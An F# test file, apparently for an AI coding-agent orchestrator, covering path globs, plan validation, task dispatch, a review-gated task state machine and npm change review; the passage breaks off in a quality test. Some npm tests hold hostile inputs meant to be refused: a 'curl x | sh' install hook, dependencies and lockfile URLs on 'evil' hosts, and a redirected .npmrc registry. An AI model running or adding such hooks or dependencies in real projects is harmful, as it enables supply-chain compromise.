module Factory.Core.Tests.Tests

open System
open System.IO
open Factory.Core

// A tiny dependency-free runner so the core can be tested anywhere `dotnet` runs.
// Swap to xUnit/Expecto when the repo has a package feed; the test bodies port unchanged.
// These tests are the spec for every TODO(you) in Factory.Core. Work order: RESOURCES.md.
open Factory.Core.Tests.Support

let p = PathPattern.createOrFail
let examples = Path.Combine(__SOURCE_DIRECTORY__, "..", "..", "examples", "pricing-v3")
let handoverJson = File.ReadAllText(Path.Combine(examples, "handover.json"))
let planJson = File.ReadAllText(Path.Combine(examples, "plan.json"))

let handover =
    match Json.parseHandover handoverJson with
    | Ok h -> h
    | Error es -> failwithf "example handover: %A" es

let plan =
    match Json.parsePlan planJson with
    | Ok x -> x
    | Error es -> failwithf "example plan: %A" es

let task id = plan.Tasks |> List.find (fun t -> t.Id = TaskId id)
let withTask id (f: PlannedTask -> PlannedTask) = { plan with Tasks = plan.Tasks |> List.map (fun t -> if t.Id = TaskId id then f t else t) }
let errorsOf pl = match PlanValidator.validate handover pl with Ok _ -> [] | Error es -> es
let validated = lazy (match PlanValidator.validate handover plan with Ok v -> v | Error es -> failwithf "%A" es)
let limits = { MaxTurns = 3; MaxVerifyAttempts = 2 }
let abOptions : DecisionOption list =
    [ { Id = "A"; Summary = "one history for the run"; Consequence = "tests must not share a quote id" }
      { Id = "B"; Summary = "key each event by quote id"; Consequence = "the parser partitions by key" } ]
let outcome name code = { Name = name; ExitCode = code; DurationMs = 10L; OutputTail = "" }
let red = match RedEvidence.Create([ outcome "a" 1 ], AssertionFailure) with Ok r -> r | Error e -> failwith e
let authored = TestsAuthored red
let stashedRed = [ outcome "a" 1 ]
let finding cat = { Category = cat; File = "src/Q.cs"; Line = 4; Message = "m" }
let reviewed blocking advisory = ReviewCompleted { Blocking = blocking; Advisory = advisory; Independence = Independent }
let approved = reviewed [] []
let verified = [ authored; TurnStarted Standard; TurnEnded; VerifyRequested; VerifyCompleted([ outcome "a" 0 ], stashedRed) ]

let tests: (string * (unit -> unit)) list =
    [
      // ---------- paths ----------
      "paths: rejects unsafe patterns", fun () ->
          for bad in [ "../x"; "/etc/passwd"; "C:/x"; "src/{a,b}/**"; "src/[ab]"; "src/a**b"; "src//x"; "" ] do
              check (Result.isError (PathPattern.create bad)) $"should reject '{bad}'"
      "paths: normalises", fun () ->
          equal "src/Quotes" (p "./src\\Quotes/").Value "normalised"
      "paths: glob matching", fun () ->
          check (PathPattern.matches (p "src/**") "src/a/b.cs") "** deep"
          check (PathPattern.matches (p "src/*.cs") "src/a.cs") "* in segment"
          check (not (PathPattern.matches (p "src/*.cs") "src/a/b.cs")) "* does not cross /"
          check (PathPattern.matches (p "src/**/Data/*.cs") "src/x/y/Data/Q.cs") "** in middle"
      "paths: overlap", fun () ->
          check (PathPattern.mayOverlap (p "src/Quotes.Data/**") (p "src/Quotes.Data/Logging/**")) "nested globs"
          check (not (PathPattern.mayOverlap (p "src/PricingApi/**") (p "src/ReferralWorker/**"))) "sibling dirs"
          check (PathPattern.mayOverlap (p "src/a.cs") (p "src/*.cs")) "exact vs glob"
          check (not (PathPattern.mayOverlap (p "src/a.cs") (p "src/b.cs"))) "distinct files"
          // live3/live4: `*` stays inside one segment, so these cannot match the same file.
          check (not (PathPattern.mayOverlap (p "db/migrations/*.sql") (p "db/migrations/pmodel/**"))) "* vs sibling dir"
          check (not (PathPattern.mayOverlap (p "src/*.cs") (p "src/*/x.cs"))) "different depth"
          check (PathPattern.mayOverlap (p "src/**/*.cs") (p "src/a/**")) "** on both sides"
          check (PathPattern.mayOverlap (p "src/*.cs") (p "src/a*")) "two wild segments"
          check (PathPattern.mayOverlap (p "db/**") (p "db/migrations/*.sql")) "** covers a deeper glob"
      "paths: containment", fun () ->
          check (PathPattern.isWithin (p "src/Quotes.Data/Logging/**") (p "src/Quotes.Data/**")) "nested"
          check (not (PathPattern.isWithin (p "src/Quotes*/**") (p "src/Quotes.Data/**"))) "prefix glob escapes"
          check (PathPattern.isWithin (p "src/Quotes.Data/Q.cs") (p "src/**/*.cs")) "exact in glob"

      // ---------- validator ----------
      "validator: example plan is valid", fun () -> equal [] (errorsOf plan) "errors"
      "validator: write outside element", fun () ->
          let es = errorsOf (withTask "T-002" (fun t -> { t with Writes = [ p "src/Quotes.Data/Hack.cs" ] }))
          check (es |> List.exists (function WriteOutsideElement _ -> true | _ -> false)) $"%A{es}"
      "validator: protected write", fun () ->
          let es = errorsOf (withTask "T-001" (fun t -> { t with Writes = p "registry/decisions/**" :: t.Writes }))
          check (es |> List.exists (function ProtectedWrite _ -> true | _ -> false)) $"%A{es}"
      "validator: an element out of scope may not be linked or written", fun () ->
          let e = (task "T-002").Elements |> List.head
          let h = { handover with Elements = handover.Elements |> List.map (fun x -> if x.Id = e then { x with InScope = false } else x) }
          let es = match PlanValidator.validate h plan with Ok _ -> [] | Error es -> es
          check (List.contains (OutOfScopeElement(TaskId "T-002", e)) es) $"%A{es}"
          check (not (es |> List.exists (function WriteOutsideElement _ -> true | _ -> false))) "reported once, as out of scope, not also as a stray write"
      "json: inScope round-trips, and a handover frozen without it reads as in scope", fun () ->
          let e = handover.Elements |> List.head
          let out = { handover with Elements = { e with InScope = false } :: List.tail handover.Elements }
          match Json.parseHandover (Json.writeHandover out) with
          | Ok back -> equal [ false ] (back.Elements |> List.truncate 1 |> List.map (fun x -> x.InScope)) "kept"
          | Error es -> failwithf "%A" es
          check (handover.Elements |> List.forall (fun x -> x.InScope)) "example handover has no inScope: in scope"
      "validator: every bound decision covered", fun () ->
          let es = errorsOf (withTask "T-001" (fun t -> { t with Covers = [] }))
          check (List.contains (UncoveredDecision(DecisionId "D-0042")) es) $"%A{es}"
      "validator: cover must touch a bound element", fun () ->
          let es = errorsOf (withTask "T-002" (fun t -> { t with Covers = [ DecisionId "D-0042" ] }))
          check (List.contains (CoverWithoutBinding(TaskId "T-002", DecisionId "D-0042")) es) $"%A{es}"
      "validator: self-seeded needs cleanup", fun () ->
          let strip = function Automated a -> Automated { a with Cleanup = None } | m -> m
          let es = errorsOf (withTask "T-001" (fun t -> { t with Verify = t.Verify |> List.map strip }))
          check (es |> List.exists (function SelfSeededWithoutCleanup _ -> true | _ -> false)) $"%A{es}"
      "validator: manual-only verify rejected", fun () ->
          let es = errorsOf (withTask "T-004" (fun t -> { t with Verify = t.Verify |> List.filter (function Manual _ -> true | _ -> false) }))
          check (List.contains (NoAutomatedVerify(TaskId "T-004")) es) $"%A{es}"
      "validator: dependency cycle and unknown dep", fun () ->
          let pl = withTask "T-001" (fun t -> { t with DependsOn = [ TaskId "T-004"; TaskId "T-999" ] })
          let es = errorsOf pl
          check (es |> List.exists (function DependencyCycle _ -> true | _ -> false)) $"cycle %A{es}"
          check (List.contains (UnknownDependency(TaskId "T-001", TaskId "T-999")) es) $"unknown %A{es}"
      "validator: handover mismatch", fun () ->
          let es = errorsOf { plan with HandoverDigest = "sha256:stale" }
          check (es |> List.exists (function HandoverMismatch _ -> true | _ -> false)) $"%A{es}"
      "validator: test writes must not overlap writes", fun () ->
          let es = errorsOf (withTask "T-001" (fun t -> { t with Writes = p "tests/Quotes.Data.Tests/**" :: t.Writes }))
          check (es |> List.exists (function TestWritesOverlapWrites(TaskId "T-001", _, _) -> true | _ -> false)) $"%A{es}"
      "validator: test write outside element", fun () ->
          let es = errorsOf (withTask "T-002" (fun t -> { t with TestWrites = p "tests/Quotes.Data.Tests/**" :: t.TestWrites }))
          check (List.contains (TestWriteOutsideElement(TaskId "T-002", p "tests/Quotes.Data.Tests/**")) es) $"%A{es}"
      "validator: invariant must run something under test writes or a protected path", fun () ->
          let es = errorsOf (withTask "T-002" (fun t -> { t with TestWrites = [] }))
          check (List.contains (InvariantNotUnderTestWrites(TaskId "T-002", "unit: retry from fresh read")) es) $"%A{es}"
      "validator: pobserve-check takes specs dir, spec and logs", fun () ->
          let withRun run =
              withTask "T-001" (fun t ->
                  { t with Verify = Automated { Name = "pobserve"; Kind = Invariant; Run = run; Cleanup = None; TimeoutSeconds = 60 } :: t.Verify })
          let arity es = es |> List.contains (PObserveCheckArity(TaskId "T-001", "pobserve"))
          let wrong = "L=$(mktemp -d) && dotnet test tests/Quotes.Data.Tests && pobserve-check db/pmodel/PSpec Optimistic"
          check (arity (errorsOf (withRun wrong))) "two arguments"
          check (arity (errorsOf (withRun "pobserve-check a b c d"))) "four arguments"
          let right = "L=$(mktemp -d) && dotnet test tests/Quotes.Data.Tests && pobserve-check db/pmodel/PSpec Optimistic \"$L\"; echo done"
          check (not (arity (errorsOf (withRun right)))) $"three arguments: %A{errorsOf (withRun right)}"
      "validator: a negative PObserve check uses --expect-violation, never !", fun () ->
          let withRun run =
              withTask "T-001" (fun t ->
                  { t with Verify = Automated { Name = "neg"; Kind = Invariant; Run = run; Cleanup = None; TimeoutSeconds = 60 } :: t.Verify })
          let negated es = es |> List.contains (NegatedPObserveCheck(TaskId "T-001", "neg"))
          let arity es = es |> List.contains (PObserveCheckArity(TaskId "T-001", "neg"))
          let bang = "F=$(mktemp) && printf x > \"$F\" && ! pobserve-check db/pmodel/PSpec NoLostUpdate \"$F\""
          check (negated (errorsOf (withRun bang))) "! pobserve-check"
          let flag = "F=$(mktemp) && printf x > \"$F\" && pobserve-check --expect-violation db/pmodel/PSpec NoLostUpdate \"$F\""
          let es = errorsOf (withRun flag)
          check (not (negated es) && not (arity es)) $"--expect-violation: %A{es}"
      "validator: every error has a description", fun () ->
          let es = errorsOf { plan with Tasks = [] ; HandoverId = "x" }
          check (es |> List.forall (fun e -> (PlanError.describe e).Length > 10)) "descriptions"

      // ---------- dispatcher ----------
      "dispatcher: example waves", fun () ->
          let d = Dispatcher.dispatch validated.Value
          let shape = d.Waves |> List.map (fun w -> w.Teams |> List.map (fun t -> t.Tasks |> List.map (fun x -> x.Id.Value)))
          equal [ [ [ "T-001"; "T-004" ] ]; [ [ "T-002" ]; [ "T-003" ] ] ] shape "waves"
      "dispatcher: teams never overlap", fun () ->
          let teams = (Dispatcher.dispatch validated.Value).Waves |> List.collect (fun w -> w.Teams)
          for a in teams do
              for b in teams do
                  if a.Id <> b.Id then
                      check (not (a.Writes |> List.exists (fun wa -> b.Writes |> List.exists (PathPattern.mayOverlap wa)))) $"{a.Id} vs {b.Id}"
      "dispatcher: cross-team cycle collapses into one team", fun () ->
          // A1 -> B1 -> A2 where A1, A2 share files and B1 is elsewhere: A and B must be one team.
          let mk id writes deps =
              { (task "T-002") with Id = TaskId id; Writes = [ p writes ]; DependsOn = deps |> List.map TaskId; Covers = [] }
          let a1 = { mk "A1" "src/PricingApi/One.cs" [] with Covers = [] }
          let b1 = { (mk "B1" "src/ReferralWorker/X.cs" [ "A1" ]) with Elements = [ ElementId "Pricing Platform/Referral Worker" ]; TestWrites = [ p "tests/ReferralWorker.Tests/**" ]; Verify = (task "T-003").Verify }
          let a2 = mk "A2" "src/PricingApi/One.cs" [ "B1" ]
          let t1 = task "T-001"
          let pl = { plan with Tasks = [ t1; a1; b1; a2 ] }
          match PlanValidator.validate handover pl with
          | Error es -> failwithf "%A" es
          | Ok vp ->
              let d = Dispatcher.dispatch vp
              let team = d.Waves |> List.collect (fun w -> w.Teams) |> List.find (fun t -> t.Tasks |> List.exists (fun x -> x.Id = TaskId "A1"))
              equal [ "A1"; "B1"; "A2" ] (team.Tasks |> List.map (fun x -> x.Id.Value)) "one team, dependency order"

      // ---------- task state ----------
      "state: happy path", fun () ->
          let s =
              TaskState.replay limits
                  [ TurnStarted Frontier; TurnEnded; authored; TurnStarted Standard; TurnEnded; VerifyRequested; VerifyCompleted([ outcome "a" 0 ], stashedRed); approved ]
          check (match s with Ok(Passed(ev, _)) -> ev.Attempt = 1 && ev.Red = red && ev.StashedImpl = stashedRed | _ -> false) $"%A{s}"
      "state: failed verify returns to Ready, then passes", fun () ->
          let s =
              TaskState.replay limits
                  [ authored; TurnStarted Standard; TurnEnded; VerifyRequested; VerifyCompleted([ outcome "a" 1 ], [])
                    TurnStarted Standard; TurnEnded; VerifyRequested; VerifyCompleted([ outcome "a" 0 ], stashedRed); approved ]
          check (match s with Ok(Passed(ev, _)) -> ev.Attempt = 2 | _ -> false) $"%A{s}"
      "state: verify budget", fun () ->
          let s =
              TaskState.replay limits
                  [ authored; TurnStarted Standard; TurnEnded; VerifyRequested; VerifyCompleted([ outcome "a" 1 ], [])
                    TurnStarted Standard; TurnEnded; VerifyRequested; VerifyCompleted([ outcome "a" 1 ], []) ]
          check (match s with Ok(Failed(VerifyBudgetExhausted _, _)) -> true | _ -> false) $"%A{s}"
      "state: surviving mutants in a green verify send the task back to the TestAuthor", fun () ->
          let s = TaskState.replay limits [ authored; TurnStarted Standard; TurnEnded; VerifyRequested; ReturnedToTestAuthor "2 mutants survived" ]
          check (match s with Ok(Ready(_, TestAuthor)) -> true | _ -> false) $"%A{s}"
      "state: survivors with the verify budget used up fail the task", fun () ->
          let s =
              TaskState.replay limits
                  [ authored; TurnStarted Standard; TurnEnded; VerifyRequested; VerifyCompleted([ outcome "a" 1 ], [])
                    TurnStarted Standard; TurnEnded; VerifyRequested; ReturnedToTestAuthor "2 mutants survived" ]
          check (match s with Ok(Failed(VerifyBudgetExhausted [ o ], _)) -> o.Name = "mutation" && o.OutputTail = "2 mutants survived" | _ -> false) $"%A{s}"
      "evidence: tests red against a mutant need no failing stash check, the mutation gate judges the change instead", fun () ->
          let mutRed = match RedEvidence.CreateAgainstMutant([ outcome "a" 0 ], 1) with Ok r -> r | Error e -> failwith e
          check (Result.isOk (VerifiedEvidence.Create(1, [ outcome "a" 0 ], mutRed, [ outcome "a" 0 ]))) "stash all green is fine"
          check (Result.isError (VerifiedEvidence.Create(1, [ outcome "a" 0 ], red, [ outcome "a" 0 ]))) "still an error for ordinary red"
      "npm: a registry dependency range is fine, a git, url, file or alias spec is not", fun () ->
          let pkg deps = $"""{{ "name": "app", "dependencies": {{ {deps} }} }}"""
          check (Result.isOk (PackageJsonChange.review "web/package.json" None (Some(pkg "\"react\": \"^18.2.0\", \"lodash\": \"latest\", \"x\": \">=1 <2\"")))) "ranges"
          for spec in [ "git+https://evil/x.git"; "github:evil/x"; "file:../x"; "link:../x"; "https://evil/x.tgz"; "npm:other@1"; "http://x/y.tgz" ] do
              check (Result.isError (PackageJsonChange.review "package.json" None (Some(pkg $"\"x\": \"{spec}\"")))) spec
      "npm: lifecycle scripts that run at install time cannot be added or changed, ordinary scripts can", fun () ->
          let pkg scripts = $"""{{ "scripts": {{ {scripts} }} }}"""
          check (Result.isOk (PackageJsonChange.review "package.json" None (Some(pkg "\"test\": \"vitest\", \"build\": \"tsc\"")))) "test, build"
          for hook in [ "preinstall"; "install"; "postinstall"; "prepare"; "prepublish" ] do
              check (Result.isError (PackageJsonChange.review "package.json" None (Some(pkg $"\"{hook}\": \"curl x | sh\"")))) hook
          let before = pkg "\"postinstall\": \"node patch.js\""
          check (Result.isOk (PackageJsonChange.review "package.json" (Some before) (Some before))) "what the repo already had is trusted"
      "npm: bundled dependencies and non-JSON are refused", fun () ->
          check (Result.isError (PackageJsonChange.review "package.json" None (Some """{ "bundleDependencies": ["x"] }"""))) "bundled"
          check (Result.isError (PackageJsonChange.review "package.json" None (Some "{ not json"))) "not json"
      "npm: overrides are judged like dependencies", fun () ->
          check (Result.isError (PackageJsonChange.review "package.json" None (Some """{ "overrides": { "x": { "y": "github:evil/y" } } }"""))) "nested override"
          check (Result.isOk (PackageJsonChange.review "package.json" None (Some """{ "overrides": { "x": "1.2.3" } }"""))) "pinned"
      "npm: lockfile resolved URLs must be on the pinned registry; .npmrc cannot change", fun () ->
          let lock url = $"""{{ "lockfileVersion": 3, "packages": {{ "": {{ "name": "app" }}, "node_modules/x": {{ "version": "1.0.0", "resolved": "{url}" }} }} }}"""
          check (Result.isOk (PackageJsonChange.review "package-lock.json" None (Some(lock "https://registry.npmjs.org/x/-/x-1.0.0.tgz")))) "registry"
          check (Result.isError (PackageJsonChange.review "package-lock.json" None (Some(lock "https://evil.example/x-1.0.0.tgz")))) "elsewhere"
          let old = lock "https://evil.example/x-1.0.0.tgz"
          check (Result.isOk (PackageJsonChange.review "package-lock.json" (Some old) (Some old))) "already there"
          check (Result.isError (PackageJsonChange.review ".npmrc" None (Some "registry=https://evil/"))) "npmrc"
      "npm: which repo files are npm restore inputs", fun () ->
          check (PackageJsonChange.affects "web/package.json" && PackageJsonChange.affects "package-lock.json" && PackageJsonChange.affects ".npmrc") "inputs"
          check (not (PackageJsonChange.affects "src/Rater.cs")) "not an input"
      "qa: a new test must fail on the baseline and pass on the integrated result", fun () ->
          let t id kind b i = { Id = id; Requirement = "R1"; Kind = kind; OnBaseline = b; OnIntegrated = i }
          equal [] (Qa.judge [ "R1" ] [ t "a" New QaFailed QaPassed ]) "ok"
          equal [ NotDone "a" ] (Qa.judge [ "R1" ] [ t "a" New QaFailed QaFailed ]) "still failing"
          equal [ Vacuous "a" ] (Qa.judge [ "R1" ] [ t "a" New QaPassed QaPassed ]) "passes on baseline: proves nothing new"
      "qa: a characterisation test that passes on the baseline and fails on the integrated result is an escape", fun () ->
          let t id kind b i = { Id = id; Requirement = "R1"; Kind = kind; OnBaseline = b; OnIntegrated = i }
          let news = t "n" New QaFailed QaPassed
          equal [] (Qa.judge [ "R1" ] [ news; t "c" Characterisation QaPassed QaPassed ]) "ok"
          equal [ Escape "c" ] (Qa.judge [ "R1" ] [ news; t "c" Characterisation QaPassed QaFailed ]) "regression"
          equal [ InvalidCharacterisation "c" ] (Qa.judge [ "R1" ] [ news; t "c" Characterisation QaFailed QaPassed ]) "cannot describe existing behaviour"
      "qa: every requirement needs a new test", fun () ->
          let t id req = { Id = id; Requirement = req; Kind = New; OnBaseline = QaFailed; OnIntegrated = QaPassed }
          equal [ Uncovered "R2" ] (Qa.judge [ "R1"; "R2" ] [ t "a" "R1" ]) "R2 has none"
          equal [ Uncovered "R1" ] (Qa.judge [ "R1" ] []) "no tests at all"
      "state: turn budget", fun () ->
          let turn = [ TurnStarted Small; TurnEnded ]
          let s = TaskState.replay limits (List.concat [ turn; turn; turn; [ TurnStarted Small ] ])
          check (match s with Ok(Failed(TurnBudgetExhausted 3, _)) -> true | _ -> false) $"%A{s}"
      "state: escalation blocks and resumes in the same phase", fun () ->
          let nd = { Question = "Retry limit for stale writes?"; Elements = []; Source = "agent"; Options = []; Recommended = None }
          let s = TaskState.replay limits [ TurnStarted Standard; NeedsDecisionRaised nd ]
          check (match s with Ok(Blocked(_, TestAuthor, _)) -> true | _ -> false) $"blocked %A{s}"
          let s2 = TaskState.replay limits [ authored; TurnStarted Standard; NeedsDecisionRaised nd; DecisionBound(DecisionId "D-0043"); TurnStarted Standard ]
          check (match s2 with Ok(Running(p, Implementer _, _)) -> p.Turns = 2 | _ -> false) $"resumed %A{s2}"
      "state: a check that cannot answer blocks the verify, and the decision resumes the implementer", fun () ->
          let nd = { Question = "verify timed out twice"; Elements = []; Source = "environment"; Options = []; Recommended = None }
          let s = TaskState.replay limits [ authored; VerifyRequested; NeedsDecisionRaised nd ]
          check (match s with Ok(Blocked(p, Implementer _, _)) -> p.VerifyAttempts = 1 | _ -> false) $"blocked %A{s}"
          let s2 = TaskState.replay limits [ authored; VerifyRequested; NeedsDecisionRaised nd; DecisionBound(DecisionId "D-1") ]
          check (match s2 with Ok(Ready(_, Implementer _)) -> true | _ -> false) $"resumed %A{s2}"
      "state: a task starts with the TestAuthor and moves on only with red evidence", fun () ->
          check (match TaskState.queued with Ready(_, TestAuthor) -> true | _ -> false) "queued phase"
          let s = TaskState.replay limits [ TurnStarted Standard; TurnEnded; authored ]
          check (match s with Ok(Ready(p, Implementer r)) -> p.Turns = 1 && r = red | _ -> false) $"%A{s}"
      "state: no verify in the TestAuthor phase, no second TestsAuthored", fun () ->
          check (Result.isError (TaskState.transition limits TaskState.queued VerifyRequested)) "verify before tests"
          check (Result.isError (TaskState.replay limits [ authored; authored ])) "authored twice"
          check (Result.isError (TaskState.replay limits [ TurnStarted Small; authored ])) "authored mid-turn"
      "state: vacuous tests send the task back to the TestAuthor", fun () ->
          let s = TaskState.replay limits [ authored; TurnStarted Standard; TurnEnded; VerifyRequested; VerifyCompleted([ outcome "a" 0 ], [ outcome "a" 0 ]) ]
          check (match s with Ok(Ready(p, TestAuthor)) -> p.VerifyAttempts = 1 | _ -> false) $"%A{s}"
      "state: the Implementer hands broken tests back to the TestAuthor, within the turn budget", fun () ->
          let back = ReturnedToTestAuthor "the P model's generated project sits inside the test project"
          let s = TaskState.replay limits [ authored; TurnStarted Standard; TurnEnded; back ]
          check (match s with Ok(Ready(p, TestAuthor)) -> p.Turns = 1 | _ -> false) $"%A{s}"
          check (Result.isError (TaskState.transition limits TaskState.queued back)) "the TestAuthor cannot hand back to itself"
          check (Result.isError (TaskState.replay limits [ authored; TurnStarted Standard; back ])) "not mid-turn"
      // ---------- task state: review ----------
      "review state: green verification is not a pass, the review is the fourth gate", fun () ->
          let s = TaskState.replay limits verified
          check (match s with Ok(Reviewing(p, Implementer _, _, None)) -> p.ReviewRounds = 0 | _ -> false) $"reviewing %A{s}"
          let passed = TaskState.replay limits (verified @ [ reviewed [] [ finding Design ] ])
          check (match passed with Ok(Passed(ev, r)) -> ev.Attempt = 1 && r.Rounds = 1 && r.Advisory = [ finding Design ] && r.Accepted = [] | _ -> false) $"%A{passed}"
          check (Result.isError (TaskState.replay limits [ authored; TurnStarted Standard; TurnEnded; approved ])) "no review before verification"
      "review state: a blocking finding sends the task back to the implementer; the fix turn counts, the review does not", fun () ->
          let s = TaskState.replay limits (verified @ [ reviewed [ finding Security ] [] ])
          check (match s with Ok(Ready(p, Implementer _)) -> p.Turns = 1 && p.ReviewRounds = 1 && p.OpenFindings = [ finding Security ] | _ -> false) $"%A{s}"
          let again = TaskState.replay limits (verified @ [ reviewed [ finding Security ] []; TurnStarted Standard; TurnEnded; VerifyRequested; VerifyCompleted([ outcome "a" 0 ], stashedRed); approved ])
          check (match again with Ok(Passed(_, r)) -> r.Rounds = 2 | _ -> false) $"%A{again}"
      "review state: weak tests go back to the test author", fun () ->
          let s = TaskState.replay limits (verified @ [ reviewed [ finding WeakTests; finding Security ] [] ])
          check (match s with Ok(Ready(p, TestAuthor)) -> p.ReviewRounds = 1 | _ -> false) $"%A{s}"
      "review state: after three blocking rounds the task parks for a designer, who accepts, rejects or guides", fun () ->
          let lim = { limits with MaxTurns = 9; MaxVerifyAttempts = 9 }
          let round = [ reviewed [ finding Intent ] []; TurnStarted Standard; TurnEnded; VerifyRequested; VerifyCompleted([ outcome "a" 0 ], stashedRed) ]
          let exhausted = verified @ round @ round @ [ reviewed [ finding Intent ] [] ]
          let nd = { Question = "q"; Elements = []; Source = "reviewer"; Options = abOptions; Recommended = None }
          let s = TaskState.replay lim exhausted
          check (match s with Ok(Reviewing(p, _, _, None)) -> p.ReviewRounds = 3 && p.OpenFindings = [ finding Intent ] | _ -> false) $"exhausted %A{s}"
          check (Result.isError (TaskState.replay lim (exhausted @ [ approved ]))) "no fourth review"
          let parked = exhausted @ [ NeedsDecisionRaised nd ]
          check (match TaskState.replay lim parked with Ok(Reviewing(_, _, _, Some n)) -> n = nd | other -> false) "parked"
          check (match TaskState.replay lim (parked @ [ ReviewAccepted("ship it", SameFamily) ]) with
                 | Ok(Passed(_, r)) -> r.Accepted = [ finding Intent ] && r.Independence = SameFamily && r.Note = Some "ship it"
                 | _ -> false) "accepted"
          check (match TaskState.replay lim (parked @ [ ReviewGuided "do X" ]) with
                 | Ok(Ready(p, Implementer _)) -> p.ReviewRounds = 0 | _ -> false) "guided gets three fresh rounds"
          check (match TaskState.replay lim (parked @ [ Abandon "rejected" ]) with Ok(Failed(Abandoned _, _)) -> true | _ -> false) "rejected"
          check (Result.isError (TaskState.replay lim (verified @ [ ReviewAccepted("x", Independent) ]))) "accept needs a parked review"
      "review state: a review that cannot be had parks the task before the rounds run out; guiding keeps the rounds used", fun () ->
          let nd = { Question = "no usable review"; Elements = []; Source = "reviewer"; Options = abOptions; Recommended = None }
          let parked = verified @ [ reviewed [ finding Intent ] []; TurnStarted Standard; TurnEnded; VerifyRequested; VerifyCompleted([ outcome "a" 0 ], stashedRed); NeedsDecisionRaised nd ]
          check (match TaskState.replay limits parked with Ok(Reviewing(p, _, _, Some n)) -> p.ReviewRounds = 1 && n = nd | _ -> false) "parked after one round"
          check (match TaskState.replay limits (parked @ [ ReviewGuided "retry" ]) with Ok(Ready(p, _)) -> p.ReviewRounds = 1 | _ -> false) "rounds kept"
          check (match TaskState.replay limits (parked @ [ ReviewAccepted("unreviewed", Independent) ]) with
                 | Ok(Passed(_, r)) -> r.Accepted = [ finding Intent ] | _ -> false) "accepted"
      "evidence: red refuses a run where nothing failed", fun () ->
          check (Result.isError (RedEvidence.Create([ outcome "a" 0; outcome "b" 0 ], AssertionFailure))) "all zero"
          check (Result.isError (RedEvidence.Create([], BuildFailure))) "empty"
          check (Result.isOk (RedEvidence.Create([ outcome "a" 0; outcome "b" 1 ], AssertionFailure))) "one red is enough"
      "red run: assertion and compile failures are red, each with its kind", fun () ->
          let failing name tail = { outcome name 1 with OutputTail = tail }
          equal (Red AssertionFailure) (RedRun.classify [ failing "a" "Failed!  - Failed: 7"; outcome "b" 0 ]) "assertions"
          equal (Red BuildFailure) (RedRun.classify [ failing "a" "Quote.cs(3,5): error CS0246: QuoteStatus"; failing "b" "Failed: 1" ]) "compile"
      "red run: a check the sandbox could not run is no evidence, whatever the other checks did", fun () ->
          let failing name code tail = { outcome name code with OutputTail = tail }
          let nuget = failing "P model check" 1 "Optimistic.csproj : error NU1301: Unable to load the service index for source https://api.nuget.org/v3/index.json."
          equal (Unrunnable [ "P model check" ]) (RedRun.classify [ failing "concurrency" 1 "Failed!  - Failed: 7"; nuget ]) "NU1301 beside a real red"
          equal (Unrunnable [ "pobserve" ]) (RedRun.classify [ failing "pobserve" 127 "bash: pobserve: command not found" ]) "missing tool"
      "red run: a refused restore ran no check: it goes back to the author with the reasons", fun () ->
          let refused = RestoreRefusal.outcome [ "tests/A/A.csproj: <Target> is not allowed" ]
          equal (Refused "tests/A/A.csproj: <Target> is not allowed") (RedRun.classify [ refused ]) "refused"
      "evidence: verified needs green and a stashed-impl run that fails", fun () ->
          check (Result.isError (VerifiedEvidence.Create(1, [], red, stashedRed))) "no empty evidence"
          check (Result.isError (VerifiedEvidence.Create(1, [ outcome "a" 1 ], red, stashedRed))) "not green"
          check (Result.isError (VerifiedEvidence.Create(1, [ outcome "a" 0 ], red, [ outcome "a" 0 ]))) "stash all green"
          check (Result.isError (VerifiedEvidence.Create(1, [ outcome "a" 0 ], red, []))) "stash missing"
          check (Result.isError (VerifiedEvidence.Create(1, [ outcome "a" 0 ], red, [ RestoreRefusal.outcome [ "x" ] ]))) "a refused restore is not a failing stash check"
          check (Result.isOk (VerifiedEvidence.Create(1, [ outcome "a" 0 ], red, stashedRed))) "all three gates"
      "state: illegal transitions rejected", fun () ->
          check (Result.isError (TaskState.transition limits TaskState.queued (VerifyCompleted([ outcome "a" 0 ], stashedRed)))) "no pass without verify"
          check (Result.isError (TaskState.transition limits TaskState.queued TurnEnded)) "no turn end before start"
      "needs-decision: a ledger row from before options decodes with none", fun () ->
          match Json.decodeTaskEvent """{"type":"needs_decision","question":"q","source":"agent","elements":[]}""" with
          | Ok(NeedsDecisionRaised nd) -> check (nd.Options = [] && nd.Recommended = None) $"%A{nd}"
          | other -> check false $"%A{other}"
      "needs-decision: options are checked before the question is accepted", fun () ->
          let errs os r = NeedsDecision.optionErrors os r
          equal [] (errs abOptions (Some "B")) "two options, known recommendation"
          equal [] (errs abOptions None) "no recommendation"
          check (not (List.isEmpty (errs [ abOptions.Head ] None))) "one option is not a choice"
          check (not (List.isEmpty (errs [ abOptions.Head; abOptions.Head ] None))) "duplicate ids"
          check (not (List.isEmpty (errs abOptions (Some "C")))) "recommendation not an option"
          check (not (List.isEmpty (errs [ { abOptions.Head with Id = "option one" }; abOptions.[1] ] None))) "id a designer can type"
          check (not (List.isEmpty (errs [ { abOptions.Head with Summary = " " }; abOptions.[1] ] None))) "empty summary"
      "needs-decision: a resolution names one of the options, or falls back to its note", fun () ->
          let nd = { Question = "q"; Elements = []; Source = "agent"; Options = abOptions; Recommended = Some "A" }
          match NeedsDecision.answer nd (Some "B") (Some "go") with
          | Ok text -> check (text.Contains "B: key each event" && text.Contains "go") text
          | Error e -> check false e
          check (Result.isError (NeedsDecision.answer nd (Some "Z") None)) "unknown option"
          equal (Ok "free text") (NeedsDecision.answer nd None (Some "free text")) "note only"
          check (Result.isOk (NeedsDecision.answer { nd with Options = [] } None None)) "nothing to choose from"
      "state: events round-trip through the ledger codec", fun () ->
          let evs =
              [ TurnStarted Frontier; TurnEnded
                NeedsDecisionRaised { Question = "q"; Elements = [ ElementId "e" ]; Source = "configurator"; Options = []; Recommended = None }
                NeedsDecisionRaised { Question = "q"; Elements = []; Source = "agent"; Options = abOptions; Recommended = Some "A" }
                DecisionBound(DecisionId "D-1"); authored; ReturnedToTestAuthor "tests broken"; VerifyRequested; VerifyCompleted([ outcome "x" 0 ], stashedRed); Abandon "stop"
                reviewed [ finding Security; finding WeakTests ] [ finding Design ]
                ReviewCompleted { Blocking = []; Advisory = []; Independence = SameFamily }
                ReviewAccepted("fine for now", SameFamily); ReviewGuided "use the repository, not a static" ]
          for e in evs do
              equal (Ok e) (Json.decodeTaskEvent (Json.encodeTaskEvent e)) "round trip"

      // ---------- quality ----------
      "quality: CRAP is c^2 (1-cov)^3 + c, and a function with no coverage data counts as uncovered", fun () ->
          let f c cov = { File = "a.cs"; Name = "F"; Line = 1; Cyclomatic = c; Lines = 10; Coverage = cov }
